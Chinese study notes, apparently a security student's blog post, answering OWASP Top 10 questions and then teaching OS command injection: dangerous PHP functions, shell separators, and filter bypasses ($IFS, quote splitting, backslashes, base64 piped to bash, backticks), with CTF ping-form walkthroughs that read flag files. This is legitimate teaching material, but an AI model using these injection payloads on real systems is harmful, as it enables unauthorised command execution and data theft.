---
title: nep
---

**1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分） **

top1：注入

top2：失效的身份认证

top3：敏感信息泄露

top4：XML外部实体（XXE）

top5：失效的访问控制

top6：安全配置错误

top7：XSS

top8：不安全的反序列化

top9：使用含有已知漏洞的组件

top10：不足的日志记录和监控

**是按照严重程度来排序的。**

**2.请翻译一下credential stuffing（1分） **

百度查到的意思是撞库。

**3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）**

日志记录是一个系统的最重要的功能之一。日志记录包括登录成功记录、登录失败记录、访问控制记录等，用来记录服务器的各种信息

日志记录不充分，会导致攻击者有机可乘，比如登陆失败记录未记录好，攻击者就可以利用此爆破攻击，这就可能让攻击者成功入侵系统并隐匿自己的行踪。

**4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分） **

使用owasp testing guide check-list对照着指南去尝试渗透

平常在做ctf题目时大多会有提示，靠的是脑洞，而不是真正的渗透，我们应该用的ctf去练习，然后真正去尝试去渗透，对着有可能的漏洞点逐一去尝试。

**5.you are only as good as you notes you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分）**

我们在学习时可以参考很多的优秀文章，通过文章去学习一些东西，真正吸收，而不是埋头乱搞，再将自己学到的知识，根据自己的了解写成笔记文章，这样才能有所成长。

# 命令执行漏洞

命令执行（Command Execution）漏洞即黑客可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。造成的原因可能是Web服务器对用户输入命令安全检测不足，导致恶意代码被执行。常见的命令执行漏洞发生在各种Web组件，包括Web容器、Web框架、CMS软件、安全组件等。

常见函数:

```
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
```

**Windows系例支持的管道符如下所示**

“|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。

![image-20210424154704440](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210424154704440.png)

“||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami。

![image-20210424154806526](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210424154806526.png)

“&”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&whoami。

![image-20210424154829468](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210424154829468.png)

“&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&&whoami。

![image-20210424154849766](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210424154849766.png)

### 常用系统命令

查看当前用户

```
CODE
users
whoami
who am i
```

查看系统名和部分信息

```
CODE
uname
uname -r
uname -s
uname -a
```

切换路径

```
CODE
cd
cd ..
cd ../
cd ../../../
cd /
cd ./xxx
```

查看文件内容

```
CODE
cat /flag 
文件完整内容
head /flag
文件前十行内容
tail /flag
文件后十行内容
```

ls() -查看当前目录下有什么文件

pwd 查看当前绝对路径

cat - 查看文件

dir -查看当前文件目录

find / -iname *fla*查看文件位置 （这里*为正则表达式的通匹符）

127.0.0.1 &&find / -name “*.txt”

**127.0.0.1 &&find / name txt 可能是错误 但是能看全部的目录**

### 长度限制

我们可以使用`>`将命令输入到文件名中。

```
PHP
<?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])<9){
     echo shell_exec($_GET[1]);
}
?>
```

这道题限制了小于9个字符，而`cat /flag`刚好有9个字符，那么我们可以将cat写到文件名中，如下：

```
CODE
>cat
```

此处代码把空字符串写入到一个名为cat的文件中，然后要执行时可以使用如下语句：

```
CODE
c* /flag
```

此时会去匹配当前文件名并且把它当成命令来执行，最终成功缩短一个字符执行了

```
cat /flag
```

# 绕过方法

#### 前缀限制

**分号**

```
CODE
ls;cat /flag
```

**连接符**

```
CODE
ls&&cat /flag
ls&cat /flag
ls|cat /flag
ls||cat /flag
```

#### 空格过滤

这个是最常见的过滤，但这个也是最容易绕过的过滤，开发方过滤了空格虽然限制了我们能执行一部分命令，但事实上是很容易绕过的，以cat flag为例子：

```
CODE
cat flag.txt
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
CODE
$IFS`、`${IFS}`、`$IFS$一位数字
```

{cat,flag} 逗号代替空格

#### 黑名单过滤

如果使用了黑名单过滤，比如把cat函数或者是把flag给禁了，那么我们可以用以下几种方式来绕过，这里需要看具体题目，这里不代表全部。

1.base64

例如过滤掉了ls，我们需要执行时可以通过把命令base64编码后用base64解码来绕过黑名单过滤。

```
CODE
echo "bHM="|base64 -d|bash  
```

`echo "bHM="|base64 -d`先前说过了，这里就是获取到ls了，此时命令为：

```
CODE
bash ls
```

bash可以理解为就是一个命令处理器，我们在命令行输入命令时都是由它来处理我们的输入，那么此时命令就相当于执行了ls。

2.引号

学过编程会知道，引号内加不加空格是有区别的，加空格时表示空一格，不加则没有。

那么我们可以用引号来打断我们的输入但又同时保持我们的最终结果。

如：

```
CODE
ca""t /fla""g
cat''t /fl''ag
```

单双引号都可以。

3.反斜杠

反斜杠为换行符，linux允许我们将语句打散到多行再执行，因此可以有：

```
CODE
c\a\t fla\g  
```

4.通配符*

通配符是正则表达式中一个很常用的符号，它遍布了很多地方，当然也包含了命令行。

通配顾名思义通通匹配，例如：

```
CODE
cat fla*
```

他就会去尝试匹配所有前缀含有fla的文件，但有可能我们目录下存在有：

```
CODE
flag
flac
flab
```

那他就没办法准确匹配到flag了。

5.拼接

这也是一种常用的绕过方法，利用的是命令行允许变量赋值的特性。

```
CODE
a=c;b=at;c=flag;$a$b $c
a=cat;b=/fl;c=ag;$a$IFS$9$b$c;
```

那么这个语句执行下来效果就会是：cat /flag。

6.内联执行

```
`命令`和$(命令)都是执行命令的方式
```

这里可以用一条题目了解一下

[GXYCTF2019]PingPingPing

这条题就不展开了，就说说这个方法

这条题是过滤掉了空格和flag的

空格前面有讲怎么绕

这个方法适合绕过flag的绕过

先看看payload：

```
?ip=127.0.0.1;cat$IFS$1`ls`
```

他的意思其实就是将输出当成输入这里的ls是通过反引号执行的，它输出的内容就被当成了输入，再通过cat读取。

# 一些简单的小题目

- ping1

输入

```
127.0.0.1|find / -name "flag"
```

出现乱码。

![](https://tcakalr.gitee.io/tc//%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20201216185928.png)

猜测flag被过滤，输入

```
127.0.0.1|find / -name "fla""g"
```

找到flag。

![](https://tcakalr.gitee.io/tc/微信图片_20201216192226.png)

读取flag

```
127.0.0.1|cat fla""g
```

![](https://tcakalr.gitee.io/tc/微信图片_202012161859281.png)

- ping2

照例找flag目录

```
127.0.0.1|find / -name "flag"
```

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859282.png)

```
127.0.0.1|cat /tmp/flag
```

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859283.png)

ping3

找flag目录，有回显别想绕过空格

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859284.png)

空格绕过方法上面有提到

在绕过空格后有提示对flag做了安保

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859286.png)

那就用""再绕

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859285.png)

找到目录，读取flag

```
127.0.0.1&&find$IFS$9/$IFS$9-name$IFS$9"fla""g"
```

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859287.png)

ping4

用ls发现不行用dir可以

得到两个文件

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859288.png)

看到有.bak文件。bak文件知识：https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/1294246a.html

下载bak文件，把bak后缀删掉打开

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012161859289.png)

发现过滤掉了许多东西可以用\绕过对cat的过滤

写入

```
127.0.0.1&&c\a\t /flag
```

读取flag